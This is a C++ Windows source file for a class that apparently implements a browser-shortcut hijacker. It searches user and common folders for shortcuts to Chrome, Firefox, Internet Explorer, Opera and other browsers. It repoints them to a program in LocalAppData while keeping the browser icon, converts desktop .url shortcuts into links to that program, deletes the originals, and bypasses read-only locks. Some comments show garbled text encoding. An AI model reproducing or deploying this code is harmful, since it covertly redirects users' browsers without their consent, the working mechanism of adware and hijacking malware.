#ifdef TEST_PROG
#include "includes.h"
#endif // TEST_PROG


#include "LinksPlaying.h"

#include <tchar.h>
#include <string>
#include <windows.h>
#include <Shlobj.h>
#include <wchar.h>
#include <SYS\Stat.h>

#include <Shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")
#include <shobjidl.h>
#include <shlguid.h>
#include <strsafe.h>

#include "Debug.h"
#include <intshcut.h>
#include <algorithm>
#include <stack>



CLinksPlaying::CLinksPlaying(void):
	m_vecBrowserNameList(NULL),
	m_vecNeededLinksPath(NULL),
	m_vecTypeUrlNameList(NULL),
	m_sAppPath(std::wstring())
{
	Init();
}


CLinksPlaying::~CLinksPlaying(void)
{
}




BOOL CLinksPlaying::LockLink(const wchar_t* Path)
{
	return SetFileAttributes(Path, FILE_ATTRIBUTE_READONLY);
}


BOOL CLinksPlaying::UnLockLink(const wchar_t* Path)
{
	return SetFileAttributes(Path, FILE_ATTRIBUTE_NORMAL);
}


void CLinksPlaying::Init(void)
{
	
	m_vecTypeUrlNameList.push_back(L"http:");	//Opera WK
	m_vecTypeUrlNameList.push_back(L"https:");	//Chrome, chromium
	m_vecTypeUrlNameList.push_back(L".com");
	m_vecTypeUrlNameList.push_back(L".net");
	m_vecTypeUrlNameList.push_back(L".org");
	m_vecTypeUrlNameList.push_back(L".tv");
	//m_vecTypeUrlNameList.push_back(L".");

	m_vecBrowserNameList.push_back(L"launcher.exe");
	m_vecBrowserNameList.push_back(L"browser.exe");	//Chrome, chromium...
	m_vecBrowserNameList.push_back(L"chrome.exe");	//Chrome, chromium...
	m_vecBrowserNameList.push_back(L"firefox.exe");	//Chrome, chromium...
	m_vecBrowserNameList.push_back(L"iexplore.exe");	//Chrome, chromium...
	m_vecBrowserNameList.push_back(L"opera.exe");
	m_vecBrowserNameList.push_back(L"torch.exe");


	Logger::_debug(L"m_vecTypeUrlNameList.size() = %d", m_vecTypeUrlNameList.size());

	m_sAppPath = this->GetAppName();

}

BOOL  CLinksPlaying::IsDots(const TCHAR* str) {
	if(_tcscmp(str,L".") && _tcscmp(str,L"..")) return FALSE;
	return TRUE;
}


void CLinksPlaying::run(void)
{
	if (S_OK == FillAllLinksPathes())
	{
		FillURLlinks();
		ReplaceAllLnk();		
	}
}



HRESULT CLinksPlaying::RecursiveFindDiles(std::wstring path, std::wstring mask, std::set<std::wstring>& LinksFileNames) 
{
	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA ffd;
	std::wstring spec;
	std::stack<std::wstring> directories;
	
	directories.push(path);
	//files.clear();

	while (!directories.empty()) {
		path = directories.top();
		spec = path + L"\\" + mask;
		directories.pop();

		hFind = FindFirstFile(spec.c_str(), &ffd);
		if (hFind == INVALID_HANDLE_VALUE)  {
			continue;
		}

		do {
			if (wcscmp(ffd.cFileName, L".") != 0 && wcscmp(ffd.cFileName, L"..") != 0)
			{
				std::wstring sFileName = ffd.cFileName;
				if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if (sFileName.find(L".") != 0)
						directories.push(path + L"\\" + sFileName.c_str());
				}
				else {

					if (sFileName.find(L".lnk") != -1 )
					{
						LinksFileNames.insert(path + L"\\" + sFileName.c_str());
					}

					if (sFileName.find(L".url") != -1 && path.find(L"Desktop") != -1)
					{
						m_setAllUsersURLlinks.insert(path + L"\\" + sFileName.c_str());
					}
				}
			}
		} while (FindNextFile(hFind, &ffd) != 0);

		if (GetLastError() != ERROR_NO_MORE_FILES) {
			FindClose(hFind);
			return false;
		}

		FindClose(hFind);
		hFind = INVALID_HANDLE_VALUE;
	}

	return S_OK;
}

//////////////////////////////////////////////////////////////////////////


HRESULT CLinksPlaying::FillAllLinksPathes(void)
{
	BOOL bRes = FALSE;
	TCHAR path[MAX_PATH]; 
	Logger::_debug(L"FillAllLinksPathes");

//	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_PROFILE, FALSE); 

	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_ALTSTARTUP, FALSE); 
	bRes = RecursiveFindDiles(path, L"*", m_setAllUsersLinks);

	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_DESKTOP, FALSE);
	bRes = RecursiveFindDiles(path, L"*", m_setAllUsersLinks);
	
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_MYDOCUMENTS, FALSE); 
	bRes = RecursiveFindDiles(path, L"*", m_setAllUsersLinks);

	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_APPDATA, FALSE);
	bRes = RecursiveFindDiles(path, L"*", m_setAllUsersLinks);

	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_LOCAL_APPDATA, FALSE);
	bRes = RecursiveFindDiles(path, L"*", m_setAllUsersLinks);

	//COMMON dirs

 	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_DESKTOPDIRECTORY, FALSE);
	bRes = RecursiveFindDiles(path, L"*", m_setAllUsersLinks);

	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_COMMON_APPDATA, FALSE);//--C:\ProgramData

	bRes = RecursiveFindDiles(path, L"*", m_setAllUsersLinks);

	if (m_setAllUsersLinks.size()>0 || m_setAllUsersLinks.size()>0)
	{
		return S_OK;
	}
	return S_FALSE;
}



HRESULT CLinksPlaying::CreateLink(const wchar_t* lpszPathToObj, const wchar_t* lpszArguments, const wchar_t* lpszLinkFileName, const wchar_t* lpszDesc, const wchar_t* lpszIconLocation)
{
	HRESULT hres;
	IShellLink *psl;

	CoInitialize(NULL);

	// ѕолучить указатель на интерфейс IShellLink
	// (NULL);
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID *)&psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile *ppf;

		// ”становить путь к €рлыку и добавить описание
		psl->SetPath(lpszPathToObj);
		psl->SetArguments(lpszArguments);
		psl->SetDescription(lpszDesc);
		psl->SetIconLocation(lpszIconLocation, 0);

		// ѕреобразовать IShellLink в IPersistFile дл€ сохранени€ €рлыка
		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID *)&ppf);

		if (SUCCEEDED(hres))
		{
			// —охранить €рлык вызовом IPersistFile::Save.
			hres = ppf->Save(lpszLinkFileName, FALSE);
			ppf->Release();
		}
		psl->Release();
	}
	CoUninitialize();
	return hres;
}


HRESULT CLinksPlaying::FillURLlinks(void)
{
	HRESULT hres;
	IShellLink* psl = NULL;

	if (m_setAllUsersURLlinks.size() <= 0) return S_FALSE;

	CoInitialize(NULL);
	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called. 
	IUniformResourceLocator *pURL = NULL;
	hres = CoCreateInstance(CLSID_InternetShortcut, NULL,
		CLSCTX_INPROC_SERVER, IID_IUniformResourceLocator, (LPVOID*)&pURL);
	if (SUCCEEDED(hres))
	{
		IPersistFile* ppf;	

		// Get a pointer to the IPersistFile interface. 
		
		hres = pURL->QueryInterface(IID_IPersistFile, (void**)&ppf);

		if (SUCCEEDED(hres))
		{

			for (std::set<std::wstring>::iterator it = m_setAllUsersURLlinks.begin(); it != m_setAllUsersURLlinks.end(); it++)
			{
				ChangeAttributes(it->c_str());
				// Load the shortcut. 				
				hres = ppf->Load((it)->c_str(), STGM_READWRITE);
				if (SUCCEEDED(hres))
				{
					LPWSTR lpTemp;
					hres = pURL->GetURL(&lpTemp);
					if (hres == S_FALSE) continue;
					std::wstring sUrlPath = lpTemp;
					//GetFileName
					
					std::wstring sTmp = it->c_str();
					sTmp = sTmp.erase(sTmp.find(L".url"));
					sTmp.append(L".lnk");


					GetAppName();

					//Create Link
					CreateLink(GetAppName().c_str(), sUrlPath.c_str(), sTmp.c_str(), L"Internet", GetAppName().c_str());

					//Erase old link	
					DeleteFile(it->c_str());
				}
			}

			ChangeAttributes(NULL, false);
			ppf->Release();
		}
		pURL->Release();
	}
	return hres;

	CoUninitialize();
	return S_FALSE;
}

HRESULT CLinksPlaying::FindUrlInString(_Out_ std::wstring & sOutUrl, _In_ std::wstring sArgs)
{

	HRESULT hRes = S_FALSE;
	for (std::vector<std::wstring>::iterator it = m_vecTypeUrlNameList.begin(); it != m_vecTypeUrlNameList.end(); it++)
	{
		if (sArgs.find(it->c_str()) != -1)
		{
			hRes = S_OK;
			while (sArgs.find(L" ") == 0)
			{
				sArgs.erase(0, 1);
			}

			while (sArgs.find(L" ") != -1)
			{
				if (sArgs.find(L" ") < sArgs.find(it->c_str()))
				{
					sArgs.erase(0, sArgs.find(L" ") + 1);
				}
				else
				{
					sArgs.erase(sArgs.find(L" "));
					
				}
			}			
		}
		break;
	}

	sOutUrl.clear();
	if (sArgs.size() > 0 && hRes == S_OK)
		sOutUrl = sArgs;
	else hRes = S_FALSE;

	return hRes;
}

HRESULT CLinksPlaying::ReplaceAllLnk(void)
{
	HRESULT hres;
	IShellLink* psl;
	WCHAR szGotPath[MAX_PATH];
	//WCHAR szDescription[MAX_PATH]; 
	WIN32_FIND_DATA wfd;


	if (m_setAllUsersLinks.size() <= 0) return S_FALSE;

	CoInitialize(NULL);
	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called. 
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile* ppf;


		// Get a pointer to the IPersistFile interface. 
		hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
		if (SUCCEEDED(hres))
		{
			//m_vecAllUsersLinks;
			for (std::set<std::wstring>::iterator it = m_setAllUsersLinks.begin(); it != m_setAllUsersLinks.end(); it++)
			{
				// Load the shortcut. 				
				hres = ppf->Load((it)->c_str(), STGM_READWRITE);
								

				hres = psl->QueryInterface(IID_IPersistFile, (void**)&ppf);
				if (SUCCEEDED(hres))
				{
					// Resolve the link. check for object(*.exe)
					hres = psl->Resolve(0, SLR_NO_UI | SLR_NO_UI_WITH_MSG_PUMP);

					if (hres == S_OK)
					{
						ChangeAttributes(it->c_str());

						//hres = psl->GetPath(szGotPath, MAX_PATH, (WIN32_FIND_DATA*)&wfd, SLGP_SHORTPATH);
						hres = psl->GetPath(szGotPath, MAX_PATH, (WIN32_FIND_DATA*)&wfd, SLGP_RAWPATH);
						
						if (!SUCCEEDED(hres))
						{
							continue;
						}
						
						std::wstring lpszPath = szGotPath;

						for (std::vector<std::wstring>::iterator it2 = m_vecBrowserNameList.begin(); it2 != m_vecBrowserNameList.end(); it2++)
						{
							if (lpszPath.find(it2->c_str()) != -1)
							{
								ChangeAttributes(it->c_str());

								//change Arguments if having some placeholder

								hres = psl->GetArguments(szGotPath, MAX_PATH);

								// sld=sadlkj ram.com dsdsdcs=sdsds 
								std::wstring sTempArg = szGotPath;


								std::wstring sTmpRplc;

								hres = FindUrlInString(sTmpRplc, sTempArg);

								if (SUCCEEDED(hres) && sTmpRplc.size() > 0)
								{
									psl->SetArguments(sTmpRplc.c_str());

								} else break;

								//change Path to object

								std::wstring sAppName = GetAppName();

								hres = psl->SetPath(sAppName.c_str());
								if (!SUCCEEDED(hres)) continue;
								if (CHANGE_ICON == TRUE)
									psl->SetIconLocation(lpszPath.c_str(), NULL);


								
								
								hres = ppf->Save((it)->c_str(), TRUE);

								break;
							}
							else 
							{ //WinXP uses uppercase names
								std::wstring sUpperNameBrws = it2->c_str();
								std::transform(sUpperNameBrws.begin(), sUpperNameBrws.end(), sUpperNameBrws.begin(), ::toupper);
								if (lpszPath.find(sUpperNameBrws.c_str()) != -1)
								{
									ChangeAttributes(it->c_str());

									//change Path to object

									std::wstring sAppName = GetAppName();

									hres = psl->SetPath(sAppName.c_str());
									if (!SUCCEEDED(hres)) continue;
									if (CHANGE_ICON == TRUE)
										psl->SetIconLocation(lpszPath.c_str(), NULL);
									//change Arguments if having some placeholder

									hres = psl->GetArguments(szGotPath, MAX_PATH);

									// sld=sadlkj ram.com dsdsdcs=sdsds 
									std::wstring sTempArg = szGotPath;


									std::wstring sTmpRplc;

									hres = FindUrlInString(sTmpRplc, sTempArg);

									if (SUCCEEDED(hres) && sTmpRplc.size() > 0)
									{
										psl->SetArguments(sTmpRplc.c_str());

									}

									hres = ppf->Save((it)->c_str(), TRUE);

									break;
								}								
							}
						}
					}
				}
			}

			ChangeAttributes(NULL, false);
			ppf->Release();
		}
		psl->Release();
	}
	return hres;


	CoUninitialize();
	return S_FALSE;

	return S_FALSE;
}

std::wstring CLinksPlaying::GetAppName()
{
	std::wstring sAppName;
	BOOL bRes = FALSE;
	TCHAR path[MAX_PATH];
	SHGetSpecialFolderPath(HWND_DESKTOP, path, CSIDL_LOCAL_APPDATA, FALSE);
	std::wstring sTemp = path;

	sAppName.clear();
	sAppName.append(sTemp);
	sAppName.append(DEF_APP_PATH);
	

	Logger::_debug(L"GetAppName (%s)", sAppName.c_str());

	return sAppName;
}


BOOL CLinksPlaying::GetLokedInfo(const wchar_t * Path)
{
	DWORD dFileAttr = 0;
	dFileAttr = GetFileAttributes(Path);

	if (dFileAttr==INVALID_FILE_ATTRIBUTES) return FALSE;

	if (dFileAttr & FILE_ATTRIBUTE_READONLY)
	{
		m_vecLinkLockedList.push_back(Path);
		return TRUE;
	}
	else
	{
		return FALSE;
	}

	return FALSE;
}


BOOL CLinksPlaying::ChangeAttributes(const wchar_t * Path, bool bUnlock)
{
	BOOL bRes = FALSE;
	if (bUnlock)
	{	
		if (GetLokedInfo(Path) )
		{
			bRes =  UnLockLink(Path);
		}
	}
	else
	{
		if (m_vecLinkLockedList.size() > 0)
		{
			for (std::vector<std::wstring>::iterator it = m_vecLinkLockedList.begin(); it != m_vecLinkLockedList.end(); it++)
			{
				bRes = LockLink(it->c_str());
			}
		}
	}



	return bRes;
}
